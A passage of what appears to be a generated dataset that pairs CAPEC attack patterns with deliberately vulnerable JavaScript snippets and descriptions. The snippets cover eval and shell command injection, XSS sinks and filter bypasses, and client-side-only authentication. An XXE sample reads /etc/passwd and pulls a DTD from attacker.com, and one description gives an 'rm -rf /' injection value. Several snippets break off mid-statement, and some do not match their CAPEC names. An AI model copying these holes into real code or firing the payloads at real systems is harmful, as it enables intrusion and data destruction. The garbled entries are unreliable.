        "description": "This code demonstrates a vulnerable resource handling implementation that allows an attacker to create requests that keep server resources tied up indefinitely. The code lacks resource limits, timeout mechanisms, and proper authorization checks. An attacker can craft requests with keepProcessing=true and nested subRequests to create an endless processing loop, preventing other users from accessing the resource. The lack of cleanup and unbounded resource allocation makes this particularly susceptible to resource exhaustion attacks."
    },
    {
        "capec_id": "228",
        "capec_name": "DTD Injection",
        "code_snippet": "`\n    const express = require('express');\n    const libxml = require('libxmljs');\n    const app = express();\n\n    app.post('/process-xml', (req, res) => {\n      const userXML = req.body.xml;\n      \n      // Vulnerable: No validation of DTD or entity expansion\n      const xmlDoc = libxml.parseXml(userXML, {\n        noent: true,\n        dtdload: true,\n        dtdvalid: true",
        "description": "\"This code creates an endpoint that accepts XML input from users and processes it without proper DTD validation or entity expansion limits. It enables external DTD loading and entity resolution without restrictions, making it vulnerable to XML Entity Expansion attacks (Billion Laughs attack) and XXE attacks. The code allows unrestricted recursive entity references and external entity references, potentially leading to denial of service or information disclosure.\""
    },
    {
        "capec_id": "229",
        "capec_name": "Serialized Data Parameter Blowup",
        "code_snippet": "const yaml = require('js-yaml');\n\nfunction parseConfig(userInput) {\n    try {\n        const data = {};\n        for(let i = 0; i < 1000; i++) {\n            data[`key${i}`] = { references: [] };\n            for(let j = 0; j < 1000; j++) {\n                data[`key${i}`].references.push({ ref: `&anchor${i}_${j}` });\n            }\n        }\n        const maliciousYaml = userInput + '\\n' + yaml.dump(data);\n        return yaml.load(maliciousYaml);\n    } catch(e) {\n        console.error('Parser error:', e);\n    }\n}",
        "description": "Vulnerable YAML parser implementation that creates a deeply nested structure with multiple references, causing excessive CPU usage during parsing. The code lacks resource limits and input validation, allowing attackers to submit malicious YAML that triggers parser inefficiencies through exponential entity expansion."
    },
    {
        "capec_id": "230",
        "capec_name": "Serialized Data with Nested Payloads",
        "code_snippet": "`\nconst yaml = require('js-yaml');\n\nfunction parseUserConfig(userInput) {\n    try {\n        const config = {",
        "description": "\"This vulnerable code demonstrates unsafe YAML parsing that allows for entity expansion and recursive references. It lacks input validation, doesn't limit resource allocation, and allows for unbounded recursion through nested YAML structures. The code processes untrusted YAML input without schema validation or size restrictions, making it susceptible to billion laughs attacks and memory exhaustion through recursive entity expansion.\""
    },
    {
        "capec_id": "231",
        "capec_name": "Oversized Serialized Data Payloads",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst xml2js = require('xml2js');\n\napp.use(express.text());\n\napp.post('/process-xml', (req, res) => {\n    const parser = new xml2js.Parser({\n        explicitArray: false,\n        async: false,\n        mergeAttrs: true\n    });\n\n    parser.parseString(req.body, (err, result) => {\n        if (err) {\n            res.status(500).send('Error parsing XML');\n            return;\n        }\n        processDeepObject(result);\n        res.json(result);\n    });\n});\n\nfunction processDeepObject(obj) {\n    for (let key in obj) {\n        if (typeof obj[key] === 'object') {\n            processDeepObject(obj[key]);\n        }\n    }\n}\n\napp.listen(3000);",
        "description": "This vulnerable code accepts XML data without schema validation and processes it recursively without any depth or size limits. It uses an XML parser without proper controls on entity expansion or input validation, making it susceptible to XML bombs and billion laughs attacks. The recursive processing function can lead to stack overflow with deeply nested XML structures."
    },
    {
        "capec_id": "233",
        "capec_name": "Privilege Escalation",
        "code_snippet": "`function userOperations(userId, action, data) {\n    let currentUser = {\n      id: userId,\n      role: getUserRole(userId)",
        "description": "\"This code demonstrates privilege escalation through multiple vulnerabilities: improper privilege management where role checks can be bypassed using an override token, insufficient isolation where privilege checks are decoupled from actual operations, and a race condition where operations can be executed before privilege verification completes. The asynchronous nature of the privilege check allows unauthorized actions to be processed in the operation queue.\""
    },
    {
        "capec_id": "234",
        "capec_name": "Hijacking a privileged process",
        "code_snippet": "`\nconst childProcess = require('child_process');\nconst fs = require('fs');\n\n// Privileged process running as root/admin\nfunction adminProcess() {\n  // Insecurely load and execute user-provided script without dropping privileges\n  let userScript = fs.readFileSync('./user_script.js');\n  \n  // Execute untrusted code with elevated privileges\n  eval(userScript);\n  \n  // Execute shell commands with full privileges\n  let userCommand = process.env.USER_COMMAND;\n  childProcess.exec(userCommand, (error, stdout, stderr) => {\n    console.log(stdout);",
        "description": "\"This code demonstrates a process running with elevated privileges that fails to properly handle untrusted input and doesn't drop privileges before executing user-provided code. It loads and executes arbitrary scripts, runs shell commands, and handles user input while maintaining unnecessary elevated privileges throughout execution.\""
    },
    {
        "capec_id": "235",
        "capec_name": "DEPRECATED: Implementing a callback to system routine (old AWT Queue)",
        "code_snippet": "`\n    // Static variable shared across threads\n    let sharedAuthToken = null;\n\n    class AuthenticationService {\n        static tokenCache = new Map();\n        \n        static verifyToken(token) {\n            return sharedAuthToken === token;",
        "description": "\"This code demonstrates multiple vulnerabilities including authentication bypass through capture-replay attacks, unsafe static variable usage in multi-threaded contexts, and improper thread synchronization. The static token storage and verification mechanism is particularly vulnerable as it lacks proper synchronization controls and can be exploited through race conditions.\""
    },
    {
        "capec_id": "236",
        "capec_name": "DEPRECATED: Catching exception throw/signal from privileged block",
        "code_snippet": "`\nconst net = require('net');\nconst server = net.createServer();\n\nlet lastAuthToken = null;\n\nserver.on('connection', (socket) => {\n  socket.on('data', (data) => {\n    try {\n      const request = JSON.parse(data);\n      const authToken = request.authToken;\n      \n      // Vulnerable code: Simple capture-replay authentication\n      if (authToken && (authToken === lastAuthToken || verifyToken(authToken))) {\n        lastAuthToken = authToken;\n        socket.write('Authentication successful');\n        executePrivilegedOperation(request);",
        "description": "\"This code demonstrates multiple vulnerabilities including capture-replay authentication bypass (CWE-294), unchecked error conditions (CWE-391), and insufficient access control (CWE-782). The server accepts and stores authentication tokens that can be easily replayed, executes privileged operations without proper verification, and ignores error conditions that could indicate malicious activity.\""
    },
    {
        "capec_id": "237",
        "capec_name": "Escaping a Sandbox by Calling Code in Another Language",
        "code_snippet": "`\nclass Sandbox {\n    constructor() {\n        this.nativeInterface = {\n            executeCommand: function(cmd) {\n                // Unsafe direct execution of native commands\n                return eval('require(\"child_process\").execSync(cmd).toString()');",
        "description": "\"A vulnerable sandbox implementation that allows untrusted code to escape isolation by providing unrestricted access to native system functionality through an exposed interface. The code demonstrates unsafe native command execution, improper error handling that leaks sensitive information, and insufficient protection mechanisms against malicious code execution.\""
    },
    {
        "capec_id": "238",
        "capec_name": "DEPRECATED: Using URL/codebase / G.A.C. (code source) to convince sandbox of privilege",
        "code_snippet": "// Constants scattered across files instead of centralized\nconst ADMIN_ROLE = 'admin';\n\nfunction parseAndAuthorize(url) {\n    // Authorization check before parsing URL\n    if (userRole === ADMIN_ROLE) {\n        // Incomplete URL parsing - vulnerable to path traversal\n        let path = url.split('?')[0];\n        \n        // Multiple unprotected paths to access admin functionality\n        if (path.includes('admin') || \n            path.includes('management') || \n            path.includes('control')) {\n            // Incorrect control flow - always returns true\n            return processAdminRequest();\n        }\n    }\n    return false;\n}\n\nfunction processAdminRequest() {\n    // Always returns true regardless of actual request validity\n    return true;\n}",
        "description": "This code demonstrates multiple security vulnerabilities: authorization checks before proper URL parsing, scattered constant definitions, improper path protection with multiple access routes to admin functionality, and incorrect control flow implementation that always allows access regardless of the actual request validity."
    },
    {
        "capec_id": "239",
        "capec_name": "DEPRECATED: Subversion of Authorization Checks: Cache Filtering, Programmatic Security, etc.",
        "code_snippet": "// Client-side authentication implementation\nclass UserAuth {\n    constructor() {\n        this.isAuthenticated = false;\n    }\n\n    login(username, password) {\n        // Client-side only authentication check\n        if(username === 'admin' && password === 'secretpass') {\n            this.isAuthenticated = true;\n            localStorage.setItem('auth_token', 'valid_token');\n            return true;\n        }\n        return false;\n    }\n\n    sendRequest() {\n        // No server-side validation, only client-side token check\n        if(localStorage.getItem('auth_token')) {\n            fetch('https://api.example.com/sensitive_data', {\n                method: 'GET',\n                headers: {\n                    'X-Auth-Token': localStorage.getItem('auth_token')\n                }\n            });\n        }\n    }\n}\n\nconst auth = new UserAuth();",
        "description": "Vulnerable implementation that relies solely on client-side authentication, storing sensitive authentication logic and tokens in client-accessible storage. The server blindly trusts the client-provided auth token without proper server-side validation, making it easy to bypass security by modifying the client code or local storage values."
    },
    {
        "capec_id": "240",
        "capec_name": "Resource Injection",
        "code_snippet": "function loadUserProfile(userId) {\n    let resourcePath = './profiles/' + userId + '.json';\n    let userProfile = require(resourcePath);\n    \n    if(userProfile) {\n        let dataIndex = userProfile.dataIndex;\n        let userData = userProfile.data[dataIndex];\n        return userData;\n    }\n    return null;\n}",
        "description": "This vulnerable code allows for resource injection through unvalidated user input in the userId parameter. An attacker could manipulate the userId to include directory traversal characters (../) or specify arbitrary file paths, potentially accessing sensitive files outside the intended directory. The code also lacks validation for the dataIndex value, which could lead to array index manipulation."
    },
    {
        "capec_id": "241",
        "capec_name": "DEPRECATED: Code Injection",
        "code_snippet": "// Using obsolete functions and insecure dynamic loading\nfunction processUserInput(userInput) {\n    var escapeHtml = unescape;  // Deprecated function\n    var userCode = escapeHtml(userInput);\n    \n    // Dynamically loading and executing user input\n    eval('function userFunction() { ' + userCode + ' }');\n    \n    // Using deprecated authentication method\n    if(document.cookie.indexOf('auth=') !== -1) {\n        return new Function(userCode)();\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities including use of deprecated functions (unescape), dangerous dynamic code execution (eval, Function), and weak authentication checks. It allows for code injection through user input and uses obsolete security practices."
    },
    {
        "capec_id": "242",
        "capec_name": "Code Injection",
        "code_snippet": "function processUserInput() {\n    let userCode = document.getElementById('userInput').value;\n    eval('function userFunction() { ' + userCode + ' }');\n    userFunction();\n}\n\nfunction executeCommand(input) {\n    let cmd = 'node ' + input;\n    require('child_process').exec(cmd, function(err, stdout, stderr) {\n        console.log(stdout);\n    });\n}",
        "description": "The code demonstrates vulnerable input handling by directly executing user-provided code through eval() and passing unchecked input to a command execution function. It allows arbitrary code execution and command injection through unvalidated user input, exemplifying CWE-94 and CWE-77."
    },
    {
        "capec_id": "243",
        "capec_name": "XSS Targeting HTML Attributes",
        "code_snippet": "function displayUserProfile(userInput) {\n    const profileDiv = document.createElement('div');\n    profileDiv.innerHTML = `\n        <img src=\"profile.jpg\" \n             style=\"${userInput}\" \n             onerror=\"alert('Image failed to load')\" \n             title=\"${userInput}\">\n        <a href=\"#\" style=\"${userInput}\">Profile Link</a>\n    `;\n    document.body.appendChild(profileDiv);\n}",
        "description": "This code is vulnerable to XSS through HTML attribute injection. It directly interpolates unvalidated user input into style and title attributes, allowing execution of malicious JavaScript through CSS expressions or event handlers. An attacker could inject JavaScript URIs or malicious CSS to execute arbitrary code when the page renders."
    },
    {
        "capec_id": "244",
        "capec_name": "XSS Targeting URI Placeholders",
        "code_snippet": "function displayUserProfile(userId) {\n    fetch('/api/user/' + userId)\n        .then(response => response.json())\n        .then(data => {\n            let profileHtml = `\n                <h2>${data.name}</h2>\n                <img src='${data.avatar}' onerror='javascript:alert(document.cookie)'>\n                <p>Website: <a href='${data.website}'>Visit Profile</a></p>\n                <div class='bio' style='${data.style}'>${data.description}</div>\n            `;\n            document.getElementById('userProfile').innerHTML = profileHtml;\n        });\n}",
        "description": "This code is vulnerable to XSS through multiple vectors: unescaped user input in HTML attributes, potentially malicious javascript: URIs in href attributes, dangerous onerror handlers in IMG tags, and unsanitized CSS styles. The code directly interpolates user-controlled data into HTML without proper encoding or validation."
    },
    {
        "capec_id": "245",
        "capec_name": "XSS Using Doubled Characters",
        "code_snippet": "function validateComment(userInput) {\n  // Vulnerable input validation that fails to catch doubled characters\n  if (!userInput.includes('<script>')) {\n    let commentSection = document.getElementById('comments');\n    // Directly inserting user input without proper sanitization\n    commentSection.innerHTML += userInput;\n    return true;\n  }\n  return false;\n}\n\n// Example usage that could be exploited\n// validateComment('<<script>alert(\"XSS\")</script>');",
        "description": "A vulnerable input validation function that fails to properly sanitize user input containing doubled characters. The function only checks for exact '<script>' matches, allowing bypass using doubled characters like '<<script>'. The unescaped input is directly inserted into the DOM using innerHTML, enabling XSS attacks."
    },
    {
        "capec_id": "246",
        "capec_name": "DEPRECATED: XSS Using Flash",
        "code_snippet": "function processUserInput(input) {\n  // Incomplete denylist for XSS\n  const blacklist = ['<script>', 'javascript:', 'onerror'];\n  let sanitized = input;\n  \n  blacklist.forEach(term => {\n    sanitized = sanitized.replace(term, '');\n  });\n\n  // Vulnerable image tag handling\n  if (sanitized.includes('img')) {\n    document.getElementById('content').innerHTML = sanitized;\n  }\n\n  // Permissive cross-domain policy\n  document.domain = '*';\n  \n  return sanitized;\n}\n\n// Usage example with doubled characters bypass\nprocessUserInput('<im<script>g src=\"x\" oonneerror=\"alert(1)\" />')",
        "description": "This code demonstrates multiple XSS vulnerabilities through incomplete sanitization, including: inadequate denylist filtering, failure to handle doubled characters, unsafe handling of IMG tag attributes, and permissive cross-domain policy. The sanitization can be bypassed using alternate syntax and character doubling techniques."
    },
    {
        "capec_id": "247",
        "capec_name": "XSS Using Invalid Characters",
        "code_snippet": "function displayUserProfile(username) {\n    let profileDiv = document.getElementById('profile');\n    if (username.indexOf('\\0') !== -1 || username.includes('\\r') || username.includes('\\n')) {\n        // Attempt to filter malicious input - but vulnerable to bypass\n        profileDiv.innerHTML = 'Invalid username';\n        return;\n    }\n    // Vulnerable: does not properly encode special characters after invalid ones\n    profileDiv.innerHTML = 'Welcome, ' + username.split('\\0').join('');\n}",
        "description": "This code attempts to filter user input by checking for null bytes and newlines, but fails to properly sanitize the entire input string and is vulnerable to XSS attacks. An attacker could inject script tags after null bytes (e.g., '\\0<script>alert(1)</script>') which would bypass the filter but still be executed when rendered in the browser."
    },
    {
        "capec_id": "248",
        "capec_name": "Command Injection",
        "code_snippet": "const express = require('express');\nconst { exec } = require('child_process');\nconst app = express();\n\napp.get('/runCommand', (req, res) => {\n    const userInput = req.query.cmd;\n    const command = 'ping ' + userInput;\n    \n    exec(command, (error, stdout, stderr) => {\n        res.send(stdout);\n    });\n});\n\napp.listen(3000);",
        "description": "This code creates a web endpoint that executes system commands based on user input. It directly concatenates user input into a command string without sanitization, allowing attackers to inject additional commands using shell metacharacters (e.g., '127.0.0.1 && rm -rf /')."
    },
    {
        "capec_id": "249",
        "capec_name": "DEPRECATED: Linux Terminal Injection",
        "code_snippet": "function executeCommand(userInput) {\n    const exec = require('child_process');\n    const command = 'echo ' + userInput;\n    return exec.execSync(command);\n}\n\nfunction processUserRequest(req) {\n    const input = req.query.command;\n    const result = executeCommand(input);\n    return result;\n}",
        "description": "Vulnerable command execution code that directly concatenates user input into a system command without sanitization, allowing command injection attacks through terminal manipulation. The code fails to neutralize special characters and can be exploited by injecting OS commands with semicolons, pipes, or other shell metacharacters."
    },
    {
        "capec_id": "250",
        "capec_name": "XML Injection",
        "code_snippet": "const express = require('express');\nconst xpath = require('xpath');\nconst dom = require('xmldom').DOMParser;\nconst app = express();\n\napp.get('/user', (req, res) => {\n    const userQuery = req.query.name;\n    const xmlData = `\n        <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n        <users>\n            <user>\n                <name>admin</name>\n                <password>secret123</password>\n                <role>admin</role>\n            </user>\n            <user>\n                <name>guest</name>\n                <password>guest456</password>\n                <role>user</role>\n            </user>\n        </users>`;\n\n    const doc = new dom().parseFromString(xmlData);\n    const query = `//user[name='${userQuery}']/password/text()`;\n    \n    try {\n        const result = xpath.select(query, doc);\n        res.send(result.toString());\n    } catch(err) {\n        res.status(500).send('Error processing request');\n    }\n});\n\napp.listen(3000);",
        "description": "This code demonstrates a vulnerable XML query implementation that directly incorporates user input into an XPath expression without proper sanitization. The endpoint accepts a 'name' parameter and uses it to query an XML document containing user credentials. An attacker could inject malicious XPath expressions to bypass authentication or extract sensitive data from the XML database."
    },
    {
        "capec_id": "251",
        "capec_name": "Local Code Inclusion",
        "code_snippet": "// Global configuration object\nlet CONFIG = {};\n\n// Dynamic library loader function\nfunction loadExternalLibrary(libraryPath) {\n    try {\n        // Dynamically load JavaScript file from local filesystem\n        const libraryCode = require('fs').readFileSync(libraryPath, 'utf8');\n        \n        // Dangerously evaluate loaded code\n        CONFIG.loadedLib = eval(libraryCode);\n        \n        // Modify global system properties\n        CONFIG.systemPath = libraryPath;\n        global.customLoader = new Function(libraryCode);\n        \n        // Execute loaded code with system privileges\n        return global.customLoader();\n    } catch(e) {\n        console.log('Failed to load library:', e);\n    }\n}",
        "description": "This code demonstrates a vulnerable library loading mechanism that allows arbitrary code execution from local files. It uses global variables, eval() for dynamic code execution, and lacks proper validation of loaded content. The code relies on machine-dependent file system access and can be exploited to load malicious or outdated libraries."
    },
    {
        "capec_id": "252",
        "capec_name": "PHP Local File Inclusion",
        "code_snippet": "const loadPHPFile = (filename) => {\n    const userInput = filename || req.query.file;\n    const phpFilePath = './php_files/' + userInput;\n    \n    const exec = require('child_process').exec;\n    exec('php ' + phpFilePath, (error, stdout, stderr) => {\n        if (error) return console.error(error);\n        return stdout;\n    });\n};\n\napp.get('/execute-php', (req, res) => {\n    const result = loadPHPFile(req.query.file);\n    res.send(result);\n});",
        "description": "This vulnerable code allows direct execution of PHP files based on user input without proper validation. It accepts a filename parameter from the query string and executes the corresponding PHP file using child_process.exec(). The code doesn't validate the file path, extension, or content, allowing potential execution of malicious PHP files. An attacker could exploit this by providing paths to unauthorized PHP files or manipulating the file parameter to execute arbitrary PHP code."
    },
    {
        "capec_id": "253",
        "capec_name": "Remote Code Inclusion",
        "code_snippet": "function loadExternalLibrary() {\n    let libUrl = new URL(location.hash.substr(1));\n    let script = document.createElement('script');\n    script.src = libUrl;\n    document.head.appendChild(script);\n\n    script.onload = function() {\n        initializeApp();\n    };\n}\n\n// Usage: example.com/app#https://untrusted-cdn.com/library.js\nloadExternalLibrary();",
        "description": "This code dynamically loads a JavaScript library from a URL specified in the page's hash fragment without any integrity checks or origin validation. An attacker could manipulate the hash to load malicious code from an arbitrary domain."
    },
    {
        "capec_id": "254",
        "capec_name": "DEPRECATED: DTD Injection in a SOAP Message",
        "code_snippet": "const xml = `<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n  <!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">\n  %dtd;\n]>\n<userInfo>\n  <name>&xxe;</name>\n  <info>&xxe1;</info>\n</userInfo>`;\n\nconst parser = new DOMParser();\nconst doc = parser.parseFromString(xml, 'application/xml');\nconsole.log(doc.documentElement.textContent);",
        "description": "This code demonstrates an XML parsing vulnerability where external DTD references are not properly restricted, allowing XXE (XML External Entity) attacks. The code accepts and processes an XML document with custom entity definitions that can lead to file disclosure and server-side request forgery through malicious DTD references."
    },
    {
        "capec_id": "256",
        "capec_name": "SOAP Array Overflow",
        "code_snippet": "function processSOAPArray(request) {\n    const declaredLength = request.arrayLength;\n    const actualData = request.arrayData;\n    \n    // Allocate buffer based on declared length without validation\n    let buffer = new Array(declaredLength);\n    \n    // Vulnerable: Copies data without checking actual length\n    for(let i = 0; i < actualData.length; i++) {\n        buffer[i] = actualData[i];\n    }\n    \n    return buffer;\n}",
        "description": "This code demonstrates a vulnerable SOAP array processing function that trusts the declared length parameter without validating it against the actual data length. It allocates a buffer based on the declared length and then copies data without bounds checking, potentially leading to buffer overflow if the actual data length exceeds the declared length."
    },
    {
        "capec_id": "257",
        "capec_name": "DEPRECATED: Abuse of Transaction Data Structure",
        "code_snippet": "// Insecure authentication and data storage\nconst users = [];\nconst debugLog = [];\n\nfunction createUser(username, password) {\n    users.push({\n        username: username,\n        password: password, // Stored in plaintext\n        data: ''\n    });\n    debugLog.push(`New user created: ${username} at ${new Date()}`);\n}\n\nfunction authenticate(username, password) {\n    // Bypass check if debug mode\n    if (process.env.DEBUG) {\n        return true;\n    }\n    const user = users.find(u => u.username === username);\n    return user && user.password === password;\n}\n\nfunction setUserData(username, data) {\n    const user = users.find(u => u.username === username);\n    if (user) {\n        user.data = data; // No validation or protection\n        debugLog.push(`Data modified for user: ${username}`);\n    }\n}",
        "description": "This code demonstrates multiple deprecated security weaknesses including unprotected data storage, plaintext password storage, authentication bypass through debug mode, and sensitive information exposure through debug logs. The code allows direct modification of stored data without proper validation, stores sensitive information in logs, and implements a bypassable authentication mechanism."
    },
    {
        "capec_id": "258",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Dynamic Update",
        "code_snippet": "// Client-side authentication code\nclass AuthenticatedClient {\n  constructor() {\n    this.sessionToken = null;\n  }\n\n  async login(username, password) {\n    const response = await fetch('/api/login', {\n      method: 'POST',\n      headers: { 'Content-Type': 'application/json' },\n      body: JSON.stringify({ username, password })\n    });\n    this.sessionToken = await response.text();\n    localStorage.setItem('auth_token', this.sessionToken);\n  }\n\n  async getData() {\n    // Client-side only authentication check\n    if (localStorage.getItem('auth_token')) {\n      const response = await fetch('/api/sensitiveData', {\n        headers: { 'Authorization': localStorage.getItem('auth_token') }\n      });\n      return await response.json();\n    }\n    return null;\n  }\n}",
        "description": "This vulnerable code implements client-side only authentication, where authentication checks are performed in the client code but not properly validated on the server side. The code stores authentication tokens in localStorage and relies on client-side checks, making it susceptible to capture-replay attacks and authentication bypass by modifying the client code to skip validation."
    },
    {
        "capec_id": "259",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Patching",
        "code_snippet": "function authenticateUser(username, password) {\n  // Client-side only authentication\n  const storedCredentials = localStorage.getItem('credentials');\n  const credentials = JSON.parse(storedCredentials);\n  \n  // Debug logging of sensitive information\n  console.log('Login attempt:', { username, password });\n  \n  if (credentials.username === username && credentials.password === password) {\n    // Store authentication token in client\n    const token = btoa(username + ':' + password);\n    localStorage.setItem('authToken', token);\n    return true;\n  }\n  return false;\n}\n\n// Network request with authentication\nfunction makeAuthenticatedRequest(url) {\n  const token = localStorage.getItem('authToken');\n  fetch(url, {\n    headers: {\n      'Authorization': 'Basic ' + token\n    }\n  });\n}",
        "description": "This vulnerable code demonstrates client-side only authentication, storing sensitive credentials in localStorage, and implementing a basic authentication scheme that's susceptible to capture-replay attacks. The code logs sensitive information and relies on client-side storage for authentication tokens without proper server-side validation."
    },
    {
        "capec_id": "260",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Initial Distribution",
        "code_snippet": "`\n    // Client-side authentication implementation\n    class ClientAuth {\n      constructor() {\n        this.authToken = null;",
        "description": "\"This code demonstrates vulnerable client-side authentication that can be bypassed through capture-replay attacks. It implements authentication logic purely on the client side, logs sensitive authentication data, and uses non-ubiquitous APIs. The authentication token can be easily captured and replayed by an attacker.\""
    },
    {
        "capec_id": "261",
        "capec_name": "Fuzzing for garnering other adjacent user/sensitive data",
        "code_snippet": "const express = require('express');\nconst mysql = require('mysql');\nconst app = express();\n\nconst connection = mysql.createConnection({\n  host: 'localhost',\n  user: 'admin',\n  password: 'secretpass',\n  database: 'userdb'\n});\n\napp.get('/user', (req, res) => {\n  const userId = req.query.id;\n  const query = `SELECT * FROM users WHERE id = ${userId}`;\n\n  connection.query(query, (error, results) => {\n    if (error) {\n      console.error('Database error:', error.stack);\n      return res.status(500).json({ error: error.stack });\n    }\n    res.json(results);\n  });\n});",
        "description": "This code demonstrates a vulnerable database query endpoint that directly uses user input in SQL queries without validation or sanitization. It also exposes sensitive information through detailed error messages. An attacker can modify the 'id' parameter to perform SQL injection and retrieve unauthorized data."
    },
    {
        "capec_id": "263",
        "capec_name": "Force Use of Corrupted Files",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction processUploadedFile(filePath) {\n    // Blindly trust the file extension\n    let extension = path.extname(filePath);\n    \n    if (extension === '.txt') {\n        // Process text file without validation\n        let content = fs.readFileSync(filePath);\n        \n        // Create temporary file in insecure location\n        let tempPath = '/tmp/temp_' + Math.random() + '.txt';\n        fs.writeFileSync(tempPath, content);\n        \n        // Import and execute content as module if it looks like JS\n        if (content.toString().includes('module.exports')) {\n            require(tempPath);\n        }\n        \n        return true;\n    }\n    return false;\n}",
        "description": "This vulnerable code demonstrates insecure file handling by trusting file extensions, creating unsafe temporary files, and potentially executing untrusted content. It blindly processes uploaded files based on extension, stores temporary files in a predictable location, and may execute malicious code if the content appears to be a JavaScript module."
    },
    {
        "capec_id": "264",
        "capec_name": "DEPRECATED: Environment Variable Manipulation",
        "code_snippet": "// Global variables with wide scope\nvar userInput = '';\nvar dbConnection = null;\nvar CONFIG = null;\n\nfunction processUserData() {\n    // Literal constants instead of symbolic ones\n    if (dbConnection.type === 'mysql') {\n        userInput = document.getElementById('userInput').value;\n        \n        // Eval injection vulnerability\n        eval('var result = ' + userInput);\n        \n        // Using global variables instead of passing parameters\n        dbConnection.query('SELECT * FROM users WHERE id = ' + result);\n    }\n}\n\nfunction initialize() {\n    // Environment variables accessed globally\n    CONFIG = {\n        DB_HOST: process.env.DB_HOST,\n        DB_USER: process.env.DB_USER,\n        DB_PASS: process.env.DB_PASS\n    };\n    \n    dbConnection = connectToDatabase(CONFIG);\n}",
        "description": "This code demonstrates multiple vulnerabilities including eval injection through unvalidated user input, excessive use of global variables, improper scoping of variables, and hard-coded literal values instead of symbolic constants. The code also shows unsafe handling of environment variables and database connections in a global scope."
    },
    {
        "capec_id": "265",
        "capec_name": "DEPRECATED: Global variable manipulation",
        "code_snippet": "// Global variables accessible throughout the application\nvar userRole = 'user';\nvar userToken = null;\nvar userData = {};\n\nfunction processUserInput(input) {\n    // Dynamic variable evaluation using eval\n    var varName = input.varToAccess;\n    eval(varName + \" = '\" + input.value + \"'\");\n}\n\nfunction authenticateUser(credentials) {\n    // Unnecessarily wide scope\n    var isAdmin = false;\n    \n    if(credentials.username === 'admin') {\n        userRole = 'admin';\n        isAdmin = true;\n        userData = { accessLevel: 'full', permissions: ['read', 'write', 'execute'] };\n    }\n\n    // Dynamic property access without validation\n    var accessProperty = credentials.requestedProperty;\n    return userData[accessProperty];\n}",
        "description": "This code demonstrates multiple vulnerabilities including excessive use of global variables (userRole, userToken, userData), dynamic variable evaluation using eval(), improper control of dynamic variables through user input, and variables declared with unnecessarily wide scope. The code allows for manipulation of arbitrary variables through user-controlled input and lacks proper validation of dynamic property access."
    },
    {
        "capec_id": "266",
        "capec_name": "DEPRECATED: Manipulate Canonicalization",
        "code_snippet": "class UserProfile {\n    constructor() {\n        this.data = {};\n    }\n\n    updateAttributes(attributes) {\n        // Vulnerable: allows modification of any attribute without validation\n        for (let key in attributes) {\n            this.data[key] = attributes[key];\n        }\n    }\n\n    processUserInput(input) {\n        // Vulnerable: validates before canonicalization\n        if (this.validateInput(input)) {\n            let sanitizedInput = this.canonicalize(input);\n            eval('this.data.userValue = ' + sanitizedInput);\n        }\n    }\n\n    validateInput(input) {\n        return input.length < 100;\n    }\n\n    canonicalize(input) {\n        return input.toLowerCase().trim();\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities including improper validation order (CWE-180), uncontrolled modification of object attributes (CWE-915), and unsafe eval usage (CWE-95). The validation occurs before canonicalization, potentially missing malicious inputs, and the updateAttributes method allows unrestricted modification of object properties. The eval usage creates an injection risk."
    },
    {
        "capec_id": "267",
        "capec_name": "Leverage Alternate Encoding",
        "code_snippet": "function processUserInput(userInput) {\n    // Validate input before decoding\n    if (userInput.length > 0) {\n        // Incomplete filtering of encoded characters\n        let decodedInput = decodeURIComponent(userInput);\n        \n        // Vulnerable file path handling\n        let filePath = './user_files/' + decodedInput;\n        \n        // Unsafe HTML injection\n        let outputDiv = document.getElementById('output');\n        outputDiv.innerHTML = 'Processing file: ' + decodedInput;\n        \n        // Basic blacklist for XSS that can be bypassed\n        let blacklist = ['<script>', 'javascript:', 'onerror='];\n        let isSafe = !blacklist.some(term => decodedInput.includes(term));\n        \n        if (isSafe) {\n            return require('fs').readFileSync(filePath, 'utf8');\n        }\n    }\n    return '';\n}",
        "description": "This code demonstrates multiple encoding-related vulnerabilities including improper handling of URL-encoded input, unsafe file path construction, inadequate XSS protection through an incomplete blacklist, and validation before decoding. The code processes user input without proper sanitization, allowing for potential directory traversal and XSS attacks through various encoding schemes."
    },
    {
        "capec_id": "268",
        "capec_name": "Audit Log Manipulation",
        "code_snippet": "const logger = {\n    logFile: 'app.log',\n    log: function(message) {\n        const entry = `${new Date().toISOString()} - ${message}`;\n        // Direct file append without access control or sanitization\n        require('fs').appendFileSync(this.logFile, entry + '\\n');\n    },\n    readLogs: function() {\n        // No access control for reading logs\n        return require('fs').readFileSync(this.logFile, 'utf8');\n    },\n    clearLogs: function() {\n        // Anyone can clear logs\n        require('fs').writeFileSync(this.logFile, '');\n    },\n    logUserActivity: function(user) {\n        // Excessive and sensitive data logging\n        this.log(`User ${user.username} logged in with password: ${user.password}\\nSSN: ${user.ssn}\\nAPI Key: ${user.apiKey}`);\n    }\n};\n\n// Example usage that could be exploited\nlogger.log('System startup');\nlogger.log('<script>alert(\"XSS\")</script>');\nlogger.logUserActivity({username: 'admin', password: 'secret123', ssn: '123-45-6789', apiKey: 'abcd1234'});",
        "description": "This vulnerable logging implementation demonstrates multiple security issues: lack of access controls for log operations, no sanitization of log entries allowing injection attacks, logging of sensitive information, excessive data logging, and unrestricted access to system logs. The code allows direct manipulation of log files and stores sensitive information in plain text."
    },
    {
        "capec_id": "269",
        "capec_name": "DEPRECATED: Registry Manipulation",
